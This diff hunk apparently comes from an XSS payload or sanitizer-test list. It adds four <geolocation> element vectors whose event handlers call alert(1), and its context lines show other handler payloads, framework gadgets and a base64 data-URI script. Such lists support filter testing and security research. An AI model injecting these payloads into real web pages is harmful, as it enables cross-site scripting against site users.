@@ -1023,6 +1023,10 @@ code
 <input type=range onlostpointercapture=alert(1)>
 <* id=x onbeforematch=alert(1) hidden=until-found>
 x<template shadowrootmode=open><slot onslotchange=alert(1)>
+<geolocation onvalidationstatuschange=alert(1)>
+<geolocation onpromptdismiss=alert(1)>
+<geolocation onpromptaction=alert(1)>
+<geolocation autolocate onlocation=alert(1)>
 <xss class=progress-bar-animated onanimationstart=alert(1)>
 <xss class=\"carousel slide\" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=\"carousel-item active\"></xss><xss class=carousel-item></xss></xss></xss>
 <script src=data:text/javascript;base64,YWxlcnQoMSk=><\/script>
